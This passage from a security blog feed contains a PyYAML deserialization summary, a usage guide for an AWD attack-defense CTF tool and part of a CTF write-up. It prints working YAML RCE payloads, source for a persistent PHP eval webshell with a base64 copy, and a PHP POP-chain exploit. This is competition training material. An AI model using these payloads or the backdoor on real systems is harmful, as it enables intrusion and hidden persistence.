class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_python_instance_state</span>(<span class="hljs-params">self, instance, state</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">&#x27;__setstate__&#x27;</span>):<br>        instance.__setstate__(state)<br>    <span class="hljs-keyword">else</span>:<br>        slotstate = &#123;&#125;<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:<br>            state, slotstate = state<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">&#x27;__dict__&#x27;</span>):<br>            instance.__dict__.update(state)<br>        <span class="hljs-keyword">elif</span> state:<br>            slotstate.update(state)<br>        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> slotstate.items():<br>            <span class="hljs-built_in">setattr</span>(<span class="hljs-built_in">object</span>, key, value)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;rce&quot;</span>, (), &#123;<span class="hljs-string">&quot;__setstate__&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>a.__setstate__(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>转为YAML</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - rce</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;__setstate__&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">state: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/summary/python_unserialize-15.png"></p><p><strong>总结：有能调用实例方法的地方，那么就可以构造一个实例，用恶意函数去替换，来执行我们的代码</strong></p><p>比如 set_python_instance_state 下的 slotstate.update(state) 也可以rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">  args: []</span><br><span class="hljs-string">  state: !!python/tuple</span><br><span class="hljs-string">    - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">    - !!python/object/new:type</span><br><span class="hljs-string">      args:</span><br><span class="hljs-string">        - exp</span><br><span class="hljs-string">        - !!python/tuple []</span><br><span class="hljs-string">        - &#123;&quot;update&quot;: !!python/name:exec , &quot;items&quot;: !!python/name:list &#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment"># 另一种写法，用 staticmethod 代替 type</span><br>yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:str</span><br><span class="hljs-string">    args: []</span><br><span class="hljs-string">    state: !!python/tuple</span><br><span class="hljs-string">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">      - !!python/object/new:staticmethod</span><br><span class="hljs-string">        args: []</span><br><span class="hljs-string">        state:</span><br><span class="hljs-string">          update: !!python/name:eval</span><br><span class="hljs-string">          items: !!python/name:list</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>参考文章：<br><a href="https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/">SecMap - 反序列化（Python）</a><br><a href="https://tttang.com/archive/1885/">python反序列化详解</a><br><a href="https://tttang.com/archive/1782/">Python pickle反序列化浅析</a><br><a href="https://goodapple.top/archives/1069">Pickle反序列化</a><br><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml">SecMap - 反序列化（PyYAML）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;python的序列化和反序列化&quot;&gt;&lt;a href=&quot;#python的序列化和反序列化&quot; class=&quot;headerlink&quot; title=&quot;python的序列化和反序列化&quot;&gt;&lt;/a&gt;python的序列化和反序列化&lt;/h1&gt;&lt;p&gt;与PHP，Java类似，python</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="python" scheme="https://www.dr0n.top/tags/python/"/>
    
    <category term="反序列化" scheme="https://www.dr0n.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>awd工具开发&amp;使用说明</title>
    <link href="https://www.dr0n.top/posts/48fe3a65/"/>
    <id>https://www.dr0n.top/posts/48fe3a65/</id>
    <published>2023-12-07T06:00:00.000Z</published>
    <updated>2024-11-04T10:52:55.705Z</updated>
    
    <content type="html"><![CDATA[<p>文章演示版本：V3.0.1<br>最新版本：V3.0.1<br>最后更新日期：2024&#x2F;10&#x2F;01</p><h2 id="目标生成"><a href="#目标生成" class="headerlink" title="目标生成"></a>目标生成</h2><blockquote><p>使用场景：在目标扫描前如果没有下发靶机地址列表，则需要自己生成一份去扫描</p></blockquote><h3 id="ip段生成"><a href="#ip段生成" class="headerlink" title="ip段生成"></a>ip段生成</h3><blockquote><p>使用场景：裁判给了一个C段（192.168.10.0），所有队伍的靶机都在这个C段中，具体ip需要自己发现</p></blockquote><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-1.png"></p><p>输入<code>192.168.10.*</code>(用*占位)即可在程序当前运行目录下生成一个<code>ip.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.10.1:8080<br>192.168.10.2:8080<br>192.168.10.3:8080<br>192.168.10.4:8080<br>192.168.10.5:8080<br>...<br>...<br>192.168.10.251:8080<br>192.168.10.252:8080<br>192.168.10.253:8080<br>192.168.10.254:8080<br>192.168.10.255:8080<br></code></pre></td></tr></table></figure><h3 id="单ip多端口生成"><a href="#单ip多端口生成" class="headerlink" title="单ip多端口生成"></a>单ip多端口生成</h3><blockquote><p>使用场景：某些小型比赛或训练赛，为了节约资源将所有靶机映射在同一台服务器的不同端口上</p></blockquote><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-2.png"></p><p>然会会在程序运行目录下生成<code>ip.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.100.103:10000<br>192.168.100.103:10001<br>192.168.100.103:10002<br>192.168.100.103:10003<br>...<br>...<br>192.168.100.103:10297<br>192.168.100.103:10298<br>192.168.100.103:10299<br>192.168.100.103:10300<br><br></code></pre></td></tr></table></figure><h3 id="bugku专用"><a href="#bugku专用" class="headerlink" title="bugku专用"></a>bugku专用</h3><blockquote><p>使用场景：针对线上的域名生成 例如 192-168-1-X.pvp3553.bugku.cn</p></blockquote><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-3.png"></p><p>按以下规则输入即可,<code>&#123;&#125;</code>中表示生成的范围，以<code>-</code>分割</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">192-168-1-&#123;1-255&#125;.pvp3553.bugku.cn<br>192-168-&#123;1-2&#125;-&#123;1-255&#125;.pvp3553.bugku.cn<br></code></pre></td></tr></table></figure><p>在当前目录下生成<code>ip.txt</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">192-168-1-1.pvp3553.bugku.cn<br>192-168-1-2.pvp3553.bugku.cn<br>192-168-1-3.pvp3553.bugku.cn<br>192-168-1-4.pvp3553.bugku.cn<br>...<br>...<br>192-168-1-252.pvp3553.bugku.cn<br>192-168-1-253.pvp3553.bugku.cn<br>192-168-1-254.pvp3553.bugku.cn<br>192-168-1-255.pvp3553.bugku.cn<br></code></pre></td></tr></table></figure><h2 id="目标扫描"><a href="#目标扫描" class="headerlink" title="目标扫描"></a>目标扫描</h2><blockquote><p>使用场景：自己生成靶机地址或通过平台下载后，进行特征扫描来识别题目</p></blockquote><h3 id="web靶机扫描"><a href="#web靶机扫描" class="headerlink" title="web靶机扫描"></a>web靶机扫描</h3><p>先打开自己的web靶机，输入网页上可以看到的特征即可</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-4.png"></p><h3 id="pwn靶机扫描"><a href="#pwn靶机扫描" class="headerlink" title="pwn靶机扫描"></a>pwn靶机扫描</h3><p>pwn靶机也是同理，先连上自己的看看会输出什么就填什么</p><p>注意文件中的地址不能带上<code>http</code>，需要是<code>ip:port</code>格式</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-5.png"></p><h2 id="写入不死马"><a href="#写入不死马" class="headerlink" title="写入不死马"></a>写入不死马</h2><blockquote><p>使用场景：发现题目的默认后门或者rce点后写入不死马</p></blockquote><h3 id="默认马"><a href="#默认马" class="headerlink" title="默认马"></a>默认马</h3><p><strong>在可以rce的参数后加<code>*</code>，多个参数用&amp;连接</strong></p><p>可写路径：一般默认为空，当某些靶机的web根目录<strong>不可写</strong>时需要手动指定，例如指定写入到<code>/var/www/html/xxx/</code>（使用绝对路径）<br>代码执行：根据shell中的代码(例如eval或者system)来使用不同的payload<br>TP框架：适用于tp等框架的非常规web路径(&#x2F;public)</p><p>Get传参后门：</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-6.png"></p><p>Post传参后门：</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-7.png"></p><p>同时会在当前目录下生成一个<code>shell.txt</code>来保存记录</p><h3 id="自定义不死马"><a href="#自定义不死马" class="headerlink" title="自定义不死马"></a>自定义不死马</h3><blockquote><p>使用场景：想写入自己自定义的不死马</p></blockquote><p>当勾选这个功能后，可以自定义不死马的内容</p><p>例如一个不死马如下，密码是123456，访问的文件名是.666.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.666.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;aa&quot;]);&#125; ?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .666.php&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用前需要base64编码一次（工具页中提供base64加解密功能）</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">PD<span class="hljs-number">9</span>waHAKICAgIGl<span class="hljs-symbol">nbm9</span>yZV<span class="hljs-number">91</span>c<span class="hljs-number">2</span>VyX<span class="hljs-number">2</span>Fib<span class="hljs-number">3</span>J<span class="hljs-number">0</span>KHRydWUpOwogICAgc<span class="hljs-number">2</span>V<span class="hljs-number">0</span>X<span class="hljs-number">3</span>RpbWVfbGltaXQoMCk<span class="hljs-number">7</span>CiAgICB<span class="hljs-number">1</span>bmxpbmsoX<span class="hljs-number">19</span>GSUxFX<span class="hljs-number">18</span>pOwogICAgJGZpbGUgPSA<span class="hljs-symbol">nLjY2</span><span class="hljs-symbol">Ni5</span>waHA<span class="hljs-symbol">nOwogICAgJGNvZGUgPSAnPD9</span>waHAgaWYobWQ<span class="hljs-number">1</span>KCRfR<span class="hljs-number">0</span>VUWyJwYX<span class="hljs-symbol">NzIl0</span>pPT<span class="hljs-number">0</span>iZTEwYWRjMzk<span class="hljs-number">0</span>OWJh<span class="hljs-symbol">NTlhYmJlNTZlMDU3</span>ZjIwZj<span class="hljs-name">g4</span><span class="hljs-name">M2</span>UiKXtAZXZhbCgkX<span class="hljs-number">1</span>BPU<span class="hljs-number">1</span>RbImFhIl<span class="hljs-number">0</span>p<span class="hljs-meta">O30</span>gPz<span class="hljs-number">4</span><span class="hljs-symbol">nOwogICAgd2</span>hpbGUgKDEpewogICAgICAgIGZpbGVfcHV<span class="hljs-number">0</span>X<span class="hljs-number">2</span><span class="hljs-symbol">NvbnRlbnRzKCRmaWxlLCRjb2</span>RlKTsKICAgICAgICBzeX<span class="hljs-symbol">N0</span>ZW<span class="hljs-number">0</span>oJ<span class="hljs-number">3</span>RvdW<span class="hljs-symbol">NoIC1</span>tIC<span class="hljs-number">1</span>kICIyMDE<span class="hljs-number">4</span>LTEyLTAxIDA<span class="hljs-number">5</span>OjEwOjEyIiAu<span class="hljs-symbol">NjY2</span>L<span class="hljs-symbol">nBocCcpOwogICAgICAgIHVzbGVlcCgxKTsKICAgIH0</span>KPz<span class="hljs-number">4</span>=<br></code></pre></td></tr></table></figure><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-8.png"></p><h3 id="随机文件名"><a href="#随机文件名" class="headerlink" title="随机文件名"></a>随机文件名</h3><blockquote><p>使用场景：防止其他队伍监控流量进行蹭车</p></blockquote><p>勾选后写入的shell的文件名，密码，连接参数随机产生</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-9.png"></p><p>会在当前目录下生成<code>random.txt</code>来保存shell记录</p><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><blockquote><p>使用场景：通过不死马或者其他漏洞点进行命令执行</p></blockquote><h3 id="一般shell执行命令"><a href="#一般shell执行命令" class="headerlink" title="一般shell执行命令"></a>一般shell执行命令</h3><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-10.png"></p><h3 id="通过随机马执行命令"><a href="#通过随机马执行命令" class="headerlink" title="通过随机马执行命令"></a>通过随机马执行命令</h3><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-11.png"></p><h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><blockquote><p>使用场景：批量获取窗口中的flag</p></blockquote><p>需要先通过执行<code>cat /flag</code>或<code>curl</code>获取到flag</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-12.png"></p><p>点击获取flag按钮后，程序会自动在返回的结果中搜索包含<code>flag&#123;&#125;</code>的值并保存到<code>flag.txt</code>中</p><p>如果flag格式并不是<code>flag&#123;&#125;</code>，则可以自定义匹配的正则表达式</p><h2 id="提交flag"><a href="#提交flag" class="headerlink" title="提交flag"></a>提交flag</h2><blockquote><p>使用场景：批量获取到flag后自动访问提交接口进行提交flag</p></blockquote><p><strong>flag用*占位。多个参数用&amp;分割。注意在设置页中设置线程数，太大容易丢包</strong></p><p>Get方式：<code>http://192.168.100.103:4444/api/flag?token=xxxx&amp;flag=xxxx</code></p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-13.png"></p><p>Post方式：</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-14.png"></p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><blockquote><p>使用场景：ssh弱口令</p></blockquote><p>比如裁判下发的ssh地址为<code>x.x.x.x:2222 密码：ctf@awd</code>，就可以知道所有队伍都是这个密码。而且有些比赛不设置防御时间，一开始就能连到其他队伍的ssh（这里就不得不提到某年的宁波市awd）</p><h3 id="ssh扫描"><a href="#ssh扫描" class="headerlink" title="ssh扫描"></a>ssh扫描</h3><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-15.png"></p><p>扫描结果会保存在<code>ssh.txt</code></p><h3 id="ssh密码更改"><a href="#ssh密码更改" class="headerlink" title="ssh密码更改"></a>ssh密码更改</h3><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-16.png"></p><h2 id="多人"><a href="#多人" class="headerlink" title="多人"></a>多人</h2><blockquote><p>使用场景：离线环境下 局域网中队友的信息传递</p></blockquote><p>其中一人先当客户端(需要先在设置中设置好参数)</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-18.png"></p><p>然后点击启动服务</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-20.png"></p><p>其余队友当客户端(同样要先在设置中设置好参数)</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-21.png"></p><p>点击连接服务即可</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-22.png"></p><p>多人交互效果：</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-23.png"></p><h2 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h2><blockquote><p>使用场景：批量发送一些请求，例如批量上传文件</p></blockquote><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-24.png"></p><h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><blockquote><p>使用场景：解放双手，自动运行</p></blockquote><p>在写入不死马，执行命令，提交flag三处可以选择定时执行任务，最短1分钟执行一次</p><p>使用方法与正常操作一样，填完参数后点击定时按钮并选择时间即可</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-25.png"></p><p>如果想取消可以关闭程序或者在全局设置中点击 <strong>管理定时任务</strong> 按钮</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-26.png"></p><p>运行结果会保存在<code>log/task_log.txt</code></p><blockquote><p>注意：此功能应谨慎使用，防止发送网络流量过大！！！注意观察 shell.txt 和 task_log.txt 的内容</p></blockquote><h2 id="工具-amp-设置"><a href="#工具-amp-设置" class="headerlink" title="工具&amp;设置"></a>工具&amp;设置</h2><blockquote><p>使用场景：base64，url的编码与解码，行去重与清屏</p></blockquote><p>支持拖放文件</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-17.png"></p><p>全局设置中可以切换线程数量和超时时间，并且可以选择是否记录错误日志</p><p><img src="/img/%E9%A1%B9%E7%9B%AE/rah-19.png"></p><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><p>V1.0.0：初始版本<br>V1.1.0：多种扫描方式，代码逻辑优化<br>V1.2.0：添加随机不死马功能，修复诺干bug</p><p>V2.1.0：70%代码重构，速度较上一代提升11倍。添加ssh和设置模块<br>V2.1.1：优化不死马的判断逻辑<br>V2.2.0：加入多人交互功能<br>V2.2.1：修复诺干bug<br>V2.2.2：更新ui，加入自定义请求包功能<br>V2.2.3：增加全局超时设置，区分代码执行与命令执行，适应tp框架路径</p><p>V3.0.0：增加一机一码，增加错误日志，优化写入不死马&#x2F;执行命令逻辑(正式公开)<br>V3.0.1：部分代码结构优化，增加定时任务功能<br>V3.1.0：增加head执行命令，优化diy模块，添加笔记功能(测试中)</p><p>同时感谢以下师傅对AWD_RAH提出的建议</p><div class="note note-info simple">            <p>@Datch （定时任务功能）<br>@liangmo （head头一句话）<br>@淡灬看夏丶恋雨(a13niL) （笔记功能）<br>@蓝猫少爷 （另一种提交flag的方式）</p>          </div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;文章演示版本：V3.0.1&lt;br&gt;最新版本：V3.0.1&lt;br&gt;最后更新日期：2024&amp;#x2F;10&amp;#x2F;01&lt;/p&gt;
&lt;h2 id=&quot;目标生成&quot;&gt;&lt;a href=&quot;#目标生成&quot; class=&quot;headerlink&quot; title=&quot;目标生成&quot;&gt;&lt;/a&gt;目标生成&lt;/h</summary>
      
    
    
    
    <category term="项目" scheme="https://www.dr0n.top/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="awd" scheme="https://www.dr0n.top/tags/awd/"/>
    
    <category term="自动化" scheme="https://www.dr0n.top/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>第六届浙江省大学生网络与信息安全竞赛-WP</title>
    <link href="https://www.dr0n.top/posts/13f4d784/"/>
    <id>https://www.dr0n.top/posts/13f4d784/</id>
    <published>2023-11-11T04:00:00.000Z</published>
    <updated>2024-03-22T06:27:53.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="初赛-easy-php"><a href="#初赛-easy-php" class="headerlink" title="初赛[easy php]"></a>初赛[easy php]</h2><p>签到题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;done&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__debuginfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> [<br>            <span class="hljs-string">&#x27;debugInfo&#x27;</span> =&gt; <span class="hljs-string">&#x27;param1&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;param1<br>        ];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;func-&gt;<span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>();<br><span class="hljs-variable">$a</span>-&gt;param1 = <span class="hljs-keyword">new</span> CCC;<br><span class="hljs-variable">$a</span>-&gt;param1-&gt;func = <span class="hljs-keyword">new</span> AAA;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h2 id="初赛-can-you-read-flag"><a href="#初赛-can-you-read-flag" class="headerlink" title="初赛[can you read flag]"></a>初赛[can you read flag]</h2><blockquote><p>好像做复杂了</p></blockquote><p>访问页面返回<code>//eval($_GET[a]);</code></p><p>爆破一下看哪些符号能用</p><p>可以用取反，例如<code>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></p><p>发现根目录有<code>flag</code>和<code>readflag</code>，flag没有权限读取</p><p><img src="/img/wp/2023/2023zhejiang-1.png"></p><p>base64转一下读取readflag</p><p><code>(~%8C%86%8C%8B%9A%92)(~%9D%9E%8C%9A%C9%CB%DF%D0%8D%9A%9E%9B%99%93%9E%98);</code></p><p><img src="/img/wp/2023/2023zhejiang-2.png"></p><p>执行readflag后要先输入一个<code>y</code>，然后进入循环开始计算式子，大概成功计算100多轮后读取flag并输出</p><p><img src="/img/wp/2023/2023zhejiang-3.png"></p><p>靶机的web目录不能读写，在&#x2F;tmp目录下写一个php脚本用来计算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$desc</span>=<span class="hljs-keyword">array</span>(<br>        <span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>),<br>        <span class="hljs-number">1</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<br>        <span class="hljs-number">2</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;file&quot;</span>,<span class="hljs-string">&quot;/tmp/error-output.txt&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>);<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&quot;/readflag&quot;</span>,<span class="hljs-variable">$desc</span>,<span class="hljs-variable">$handle</span>);<br><span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$wh</span>=<span class="hljs-variable">$handle</span>[<span class="hljs-number">0</span>];<br><span class="hljs-variable">$rh</span>=<span class="hljs-variable">$handle</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$rh</span> <span class="hljs-subst">$wh</span> open\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$handle</span>);<br><span 